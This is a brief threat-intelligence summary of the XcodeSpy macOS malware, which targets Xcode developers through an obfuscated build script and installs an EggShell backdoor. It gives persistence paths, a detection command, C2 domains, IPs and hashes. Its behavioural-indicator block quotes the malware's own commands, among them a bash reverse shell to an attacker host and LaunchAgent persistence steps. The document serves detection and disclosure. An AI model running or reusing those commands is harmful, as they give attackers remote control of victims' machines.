# New macOS malware XcodeSpy Targets Xcode Developers with EggShell Backdoor

- Obfuscated Run script phase in open source project
- Drops a custom variant of the Eggshell backdoor on the dev mac
- Installs a user LaunchAgent for persistence at `~/Library/LaunchAgents/com.apple.usagestatistics.plist` or `~/Library/LaunchAgents/com.apple.appstore.checkupdate.plist`, that checks to see if the original executable is running; if not, it creates a copy of the executable from a ‘master’ version at `~/Library/Application Support/com.apple.AppStore/.update` then executes it.
- Creates a hidden file called `.tag` in `/private/tmp` which contains command `mdbcmd`
- Creates a zero byte file at `/private/tmp/wt0217.lck` and a data file at `~/Library/Application Scripts/com.apple.Preview.stors`
- `/tmp/.avatmp`, a default path found in the public EggShell repo for storing AV captures
- Is able to record audio, camera and keyboard

## Detection and Mitigation

Execute:

```
find . -name "project.pbxproj" -print0 | xargs -0 awk '/shellScript/ && /eval/{print "\033[37m" $0 "\033[31m" FILENAME}'
```

to search for Run Scripts in the Build Phases part of an Xcode project (within the project.pbxproj file) containing both the strings `shellScript` and `eval`. If any are found, it prints out a copy of the script for inspection, along with the filename in which it was found.

## Indicators of Compromise
### URLs & Resolving IPs
www[.]cralev.me/
hxxps://www[.]liveupdate.cc/preview/update.php
hxxps://www[.]appmarket.co/category/search.php
hxxps://www[.]recentnews.cc/latest/details.php
hxxps://www[.]truckrental.cc/order/search.php
hxxps://www[.]everestnote.com/sheet/list.php
hxxps://www[.]alinbox.co/product/product_detail.php
hxxps://www[.]suppro.co/category/search.php

193.34.167.111
193.34.167.205

### EggShell bins: */.update
SHA 256: 6d93a714dd008746569c0fbd00fadccbd5f15eef06b200a4e831df0dc8f3d05b
SHA 1: 556a2174398890e3d628aec0163a42a7b7fb8ffd
SHA 256: cdad080d2caa5ca75b658ad102987338b15c7430c6f51792304ef06281a7e134
SHA 1: 0ae9d61185f793c6d53e560e91265583675abeb6

### Xcode proj: TabBarInteraction.zip
SHA 256: 1cfa154d0145c1fe059ffe61e7b295c16bbc0e0b0e707e7ad0b5f76c7d6b66d2
SHA 1: d65334d6c829955947f0ceb2258581c59cfd7dab

### Encoded Filepaths
~/Library/Application Scripts/com.apple.TextEdit/.stors
~/Library/Application Scripts/com.apple.Preview/.stors
~/Library/Application Scripts/com.apple.usernoted/.wfy1607
~/Library/Application Scripts/com.apple.TextEdit/.scriptdb
~/Library/Application Support/com.apple.AppStore/.update
~/Library/Application Support/com.apple.usernoted/.wfy1607
~/Library/LaunchAgents/com.apple.usagestatistics.plist
~/Library/LaunchAgents/com.apple.appstore.checkupdate.plist
/private/tmp/.osacache
/private/tmp/.osacache2
/private/tmp/.update
/tmp/.avatmp
/private/tmp/.wt0217.lck
/private/tmp/.tag

### Behavioral Indicators
```
killall %@;sleep 3;cp "%@" "%@";chmod +x "%@";"%@" %@ 1>/dev/null 2>/dev/null
if (! pgrep -x %@ >/dev/null);then cp "%@" "%@";chmod +x "%@";"%@";fi;
sleep 1;launchctl unload "%@" > /dev/null;launchctl load "%@" > /dev/null
launchctl unload "%@" 2>/dev/null; rm "%@"
echo mdbcmd > /private/tmp/.tag;bash&> /dev/tcp/www.cralev.me/443 0>&1 &
```

## [Source](https://labs.sentinelone.com/new-macos-malware-xcodespy-targets-xcode-developers-with-eggshell-backdoor/)